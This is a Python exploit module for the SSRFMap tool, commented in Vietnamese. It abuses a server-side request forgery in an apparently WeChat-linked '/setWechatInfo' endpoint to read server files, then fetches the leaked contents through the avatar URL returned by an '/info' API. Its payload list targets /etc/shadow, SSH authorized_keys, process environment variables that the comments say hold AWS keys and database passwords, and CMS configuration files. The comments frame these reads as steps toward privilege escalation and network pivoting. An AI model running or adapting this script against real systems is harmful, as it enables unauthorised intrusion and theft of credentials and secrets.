from core.utils import *
import logging
import requests
import json
import time
import os

# Metadata module
name          = "mass_scan"
description   = "Quét nhanh và lưu các mục tiêu đọc được vào file valid_targets.txt"
author        = "SSRFMap User"
documentation = []

class exploit():

    def __init__(self, requester, args):
        logging.info(f"Module '{name}' launched - Scanning targets...")

        # Xóa file kết quả cũ nếu có để ghi mới
        output_file = "valid_targets.txt"
        if os.path.exists(output_file):
            os.remove(output_file)

        # Xây dựng các biến cơ bản
        target_url_base = f"{requester.protocol}://{requester.host}{requester.action}"
        info_api = target_url_base.replace("/setWechatInfo", "/info")
        
        # --- DANH SÁCH MỤC TIÊU CẦN QUÉT ---
        targets = [
            # 1. THÔNG TIN HỆ THỐNG & USER
            "file:///etc/passwd",           # Liệt kê danh sách user trên server
            "file:///etc/group",            # Xem các nhóm quyền hạn
            "file:///etc/shadow",         # Xem file mật khẩu (nếu có thể)
            "file:///etc/os-release",       # Xem phiên bản Linux chính xác (Ubuntu/CentOS...)
            "file:///etc/issue",            # Banner chào mừng (thường chứa tên OS)
            "file:///proc/version",         # Xem phiên bản Kernel (để tìm lỗ hổng leo quyền)
            "file:///proc/mounts",         # Xem các phân vùng đã mount (để tìm NFS share)
            "file:///proc/cpuinfo",         # Xem thông tin CPU (để biết là máy ảo hay vật lý)
            "file:///proc/meminfo",        # Xem thông tin RAM (để biết là máy ảo hay vật lý)
            "file:///var/log/auth.log",    # Xem log đăng nhập (Ubuntu/Debian)
            "file:///var/log/secure",      # Xem log đăng nhập (CentOS/RHEL)
            "file:///home/",               # Liệt kê thư mục home (xem có user nào đáng chú ý không)
            "file:///root/",               # Liệt kê thư mục root (xem có file gì quan trọng không)
            "file:///tmp/",                # Liệt kê thư mục tạm (thường có file upload bất hợp pháp)
            "file:///var/www/html/",       # Liệt kê thư mục web root (xem có file gì thú vị không)
            "file:///usr/local/",          # Liệt kê thư mục cài đặt phần mềm thủ công
            "file:///opt/",                # Liệt kê thư mục opt (thường chứa phần mềm bên thứ 3)
            "file:///var/lib/",            # Liệt kê thư mục var lib (thường chứa dữ liệu ứng dụng)
            "file:///etc/crontab",         # Xem cấu hình cron jobs (để tìm lỗ hổng leo quyền)
            "file:///var/spool/cron/",     # Xem các cron job của user (thường chứa mật khẩu)
            "file:///etc/sudoers",         # Xem cấu hình sudo (để tìm lỗ hổng leo quyền)
            "file:///etc/ssh/sshd_config", # Xem cấu hình SSH (để tìm lỗ hổng đăng nhập)
            "file:///root/.ssh/authorized_keys", # Xem khóa SSH được phép đăng nhập
            "file:///home/www/.ssh/authorized_keys", # Xem khóa SSH user www
            "file:///var/www/.ssh/authorized_keys", # Xem khóa SSH user www
            "file:///home/admin/.ssh/authorized_keys", # Xem khóa SSH user admin
            "file:///home/user/.ssh/authorized_keys",  # Xem khóa SSH user user
            "file:///proc/1/cgroup",       # Xem có đang chạy trong container không (Docker/Kubernetes)


            # 2. THÔNG TIN MẠNG (QUAN TRỌNG ĐỂ PIVOTING)
            "file:///etc/hosts",            # Xem các mapping IP-Domain nội bộ (quan trọng!)
            "file:///etc/resolv.conf",      # Xem DNS Server (gợi ý về hạ tầng mạng)
            "file:///etc/hostname",         # Tên máy chủ
            "file:///proc/net/arp",         # Bảng ARP (xem các máy khác trong mạng LAN)
            "file:///proc/net/tcp",         # Các kết nối TCP đang mở (dạng hex)
            "file:///proc/net/fib_trie",    # Bảng định tuyến chi tiết
            "file:///proc/net/if_inet6",    # Thông tin giao diện mạng IPv6
            "file:///sys/class/net/",       # Thông tin các giao diện mạng
            "file:///var/log/syslog",       # Xem log hệ thống (Ubuntu/Debian)
            "file:///var/log/messages",     # Xem log hệ thống (CentOS/RHEL)
            "file:///var/log/nginx/access.log",  # Xem log truy cập Nginx
            "file:///var/log/nginx/error.log",   # Xem log lỗi Nginx
            "file:///var/log/httpd/access_log",  # Xem log truy cập Apache
            "file:///var/log/httpd/error_log",   # Xem log lỗi Apache

            # 3. THÔNG TIN PROCESS & MÔI TRƯỜNG (CỰC KỲ QUAN TRỌNG)
            "file:///proc/self/environ",    # Biến môi trường (thường chứa AWS KEY, DB PASSWORD!)
            "file:///proc/self/cmdline",    # Lệnh dùng để khởi chạy web server
            "file:///proc/self/status",     # Trạng thái process hiện tại (UID/GID)
            "file:///proc/self/cwd/index.php", # Thử đọc file code chính (nếu đúng đường dẫn)
            "file:///proc/self/cwd/app/config/database.php", # Thử đọc file config DB của Laravel
            "file:///proc/self/cwd/config.php", # Thử đọc file config phổ thông
            "file:///proc/self/cwd/wp-config.php", # Thử đọc file config WordPress
            "file:///proc/self/cwd/typo3conf/LocalConfiguration.php", # Thử đọc file config TYPO3
            "file:///proc/self/cwd/includes/config.php", # Thử đọc file config Joomla
            "file:///proc/self/cwd/settings.php", # Thử đọc file config Drupal
            "file:///proc/self/cwd/app/etc/local.xml", # Thử đọc file config Magento 1
            "file:///proc/self/cwd/app/etc/env.php",   # Thử đọc file
            
            # 4. CẤU HÌNH WEB SERVER (THƯỜNG GẶP)
            # Thử vận may với Nginx/Apache nếu đường dẫn mặc định
            "file:///etc/nginx/nginx.conf",
            "file:///etc/apache2/apache2.conf",
            "file:///etc/httpd/conf/httpd.conf",
            "file:///etc/nginx/sites-enabled/default",
            "file:///etc/apache2/sites-enabled/000-default.conf",
            "file:///etc/httpd/conf.d/vhost.conf",
            "file:///usr/local/nginx/conf/nginx.conf",
            "file:///usr/local/apache2/conf/httpd.conf",
            "file:///usr/local/etc/nginx/nginx.conf",
            "file:///usr/local/etc/apache24/httpd.conf",
        ]

        print("\n" + "="*80)
        print(f"{'PAYLOAD / TARGET':<50} | {'STATUS':<10} | {'NOTE'}")
        print("="*80)

        for payload in targets:
            self.scan_target(requester, args, payload, info_api, output_file)
            time.sleep(0.3)
            
        print("="*80 + f"\n[+] Scan Completed. Valid targets saved to '{output_file}'.\n")

    def scan_target(self, requester, args, payload, info_api, output_file):
        try:
            requester.do_request(args.param, payload)
            response = requests.get(info_api, headers=requester.headers)
            
            status = "UNKNOWN"
            note = ""
            color_start = ""
            color_end = "\033[0m"
            is_success = False

            if response.status_code == 200:
                try:
                    data = response.json()
                    if 'data' in data and isinstance(data['data'], dict) and 'avatar' in data['data']:
                        file_url = data['data']['avatar']
                        
                        if not file_url:
                            status = "FAILED" 
                            color_start = "\033[91m" # Red
                        else:
                            if file_url.startswith("/"):
                                base_url = f"{requester.protocol}://{requester.host}"
                                file_url = base_url + file_url
                            
                            try:
                                content_resp = requests.get(file_url, timeout=3)
                                content_len = len(content_resp.text)
                                content_text = content_resp.text

                                if content_len > 0:
                                    if "error" in content_text and "Required metadata header" in content_text:
                                        status = "DETECTED"
                                        note = "Blocked"
                                        color_start = "\033[93m" # Yellow
                                        # Vẫn coi là thành công vì chứng minh được SSRF
                                        is_success = True 
                                    elif "Bad Request" in content_text or "400" in content_text:
                                        status = "WARNING"
                                    else:
                                        status = "SUCCESS"
                                        note = f"Size: {content_len} bytes"
                                        color_start = "\033[92m" # Green
                                        is_success = True
                                else:
                                    status = "EMPTY"
                            except:
                                status = "ERROR"
                    else:
                        status = "NO DATA"
                except:
                    status = "ERR JSON"
            else:
                status = f"HTTP {response.status_code}"

            # In kết quả
            display_payload = payload if len(payload) < 45 else payload[:42] + "..."
            print(f"{color_start}{display_payload:<50} | {status:<10} | {note}{color_end}")

            # LƯU KẾT QUẢ NẾU THÀNH CÔNG
            if is_success:
                with open(output_file, "a") as f:
                    f.write(payload + "\n")

        except Exception as e:
            print(f"Error scanning: {e}")